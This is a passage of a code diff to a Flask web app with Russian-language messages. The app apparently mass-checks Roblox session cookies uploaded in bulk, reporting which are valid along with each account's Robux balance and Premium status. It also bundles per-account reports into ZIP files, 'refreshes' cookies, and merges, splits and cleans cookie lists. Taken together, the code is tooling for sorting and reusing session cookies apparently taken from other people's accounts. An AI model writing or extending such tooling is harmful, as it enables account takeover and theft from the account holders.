     file = request.files.get('file')
     if not file:
         return jsonify({"success": False, "message": "Файл не предоставлен"})
-        
     content = file.read().decode('utf-8', errors='ignore')
     cookies = [line.strip() for line in content.splitlines() if line.strip()]
     if not cookies:
         return jsonify({"success": False, "message": "Файл пуст"})
-        
+    
     def run_process():
         total = len(cookies)
         valid_count = 0
+        invalid_count = 0
         total_robux = 0
         premium_count = 0
-        
         usernames = []
         full_reports = []
         
         with ThreadPoolExecutor(max_workers=30) as executor:
             future_to_cookie = {executor.submit(get_account_data, c): c for c in cookies}
             completed = 0
-            
             for future in as_completed(future_to_cookie):
                 completed += 1
                 info = future.result()
                 rep = None
-                
                 if info:
                     valid_count += 1
                     total_robux += info["robux"]
@@ -751,31 +794,31 @@ def mass_check_ws():
                     usernames.append(info["username"])
                     rep = format_single_report(info)
                     full_reports.append(rep)
-                    
+                else:
+                    invalid_count += 1
+                    rep = "❌ Невалидный кук"
+                
                 socketio.emit('mass_progress', {
                     "current": completed,
                     "total": total,
-                    "result": rep if info else None,
+                    "result": rep,
                     "full_report": rep if info else None
                 })
-                
-        # Сводный отчёт
-        summary = f"""========================================
-🚀 МАССОВАЯ ПРОВЕРКА ЗАВЕРШЕНА
-========================================
-📊 Статистика:
-- Всего проверено: {total}
-- Валидных аккаунтов: {valid_count}
-- Всего Robux: {total_robux:,}
-- Premium аккаунтов: {premium_count}
-========================================
+        
+        summary_header = f"""📊 ОТЧЁТ О ПРОВЕРКЕ
+══════════════════════════════════════════════════════
+📦 Всего куки: {total}
+✅ Валидных: {valid_count} | ❌ Невалидных: {invalid_count}
+💰 Всего Robux: {total_robux:,}
+⭐ Premium: {premium_count}
+══════════════════════════════════════════════════════
 
-""" + "\n\n".join(full_reports)
-
+"""
+        full_output = summary_header + "\n\n".join(full_reports)
         save_checker_history_entry("mass", valid_count, total, usernames, full_reports)
         
         socketio.emit('mass_complete', {
-            "message": summary,
+            "message": full_output,
             "valid_count": valid_count,
             "total_robux": total_robux,
             "premium_count": premium_count
@@ -788,14 +831,12 @@ def mass_check_ws():
 def download_zip():
     data = request.json or {}
     reports = data.get('reports', [])
-    
     memory_file = io.BytesIO()
     with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
         for idx, rep in enumerate(reports, 1):
             match = re.search(r'👤 АККАУНТ:\s*([^\n\r]+)', rep)
             uname = match.group(1).split('(')[0].strip() if match else f"acc_{idx}"
             zf.writestr(f"{uname}.txt", rep)
-            
     memory_file.seek(0)
     return send_file(memory_file, download_name="accounts_reports.zip", as_attachment=True)
 
@@ -804,16 +845,13 @@ def run_fresher_api():
     data = request.json or {}
     cookies_raw = data.get('cookies', '')
     mode = data.get('mode', 'duplicate')
-    
     cookies = [c.strip() for c in cookies_raw.splitlines() if c.strip()]
     if not cookies:
         return jsonify({"only_cookies": "Ошибка: Пустой ввод"})
-        
     refreshed = []
     usernames = []
-    
     with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = [executor.submit(refresh_cookie_action, c, mode) for c in cookies]
+        futures = [executor.submit(refresh_cookie_simple, c, mode) for c in cookies]
         for f in as_completed(futures):
             res = f.result()
             if res:
@@ -821,7 +859,6 @@ def run_fresher_api():
                 info = get_account_data(res)
                 if info:
                     usernames.append(info['username'])
-                    
     save_fresher_history_entry(mode, len(refreshed), usernames, refreshed)
     return jsonify({"only_cookies": "\n".join(refreshed)})
 
@@ -855,13 +892,11 @@ def merge_cookies():
             c = clean_cookie(l)
             if c:
                 merged.add(c)
-                
     content = "\n".join(merged)
     os.makedirs("downloads", exist_ok=True)
     out_path = os.path.join("downloads", "merged.txt")
     with open(out_path, "w", encoding="utf-8") as out:
         out.write(content)
-        
     return jsonify({"success": True, "download_url": "/downloads/merged.txt"})
 
 @app.route('/api/split-cookies', methods=['POST'])
@@ -869,7 +904,6 @@ def split_cookies():
     files = request.files.getlist('files')
     text = request.form.get('text', '')
     per_file = int(request.form.get('per_file', 1))
-    
     cookies = []
     if files:
         for f in files:
@@ -881,19 +915,14 @@ def split_cookies():
         for l in text.splitlines():
             c = clean_cookie(l)
             if c: cookies.append(c)
-            
     if not cookies:
         return jsonify({"success": False, "message": "Нет куков для разделения"})
-        
     chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
-    
     os.makedirs("downloads", exist_ok=True)
     zip_path = os.path.join("downloads", "split_cookies.zip")
-    
     with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
         for idx, chunk in enumerate(chunks, 1):
             zf.writestr(f"cookies_part_{idx}.txt", "\n".join(chunk))
-            
     return jsonify({"success": True, "total_files": len(chunks), "download_url": "/downloads/split_cookies.zip"})
 
 @app.route('/api/clean-cookies', methods=['POST'])
@@ -906,12 +935,10 @@ def clean_cookies():
         c = clean_cookie(l)
         if c:
             unique.add(c)
-            
     os.makedirs("downloads", exist_ok=True)
     out_path = os.path.join("downloads", "cleaned.txt")
     with open(out_path, "w", encoding="utf-8") as out:
         out.write("\n".join(unique))
-        
     return jsonify({"success": True, "count": len(unique), "download_url": "/downloads/cleaned.txt"})
 
 @app.route('/downloads/<filename>')
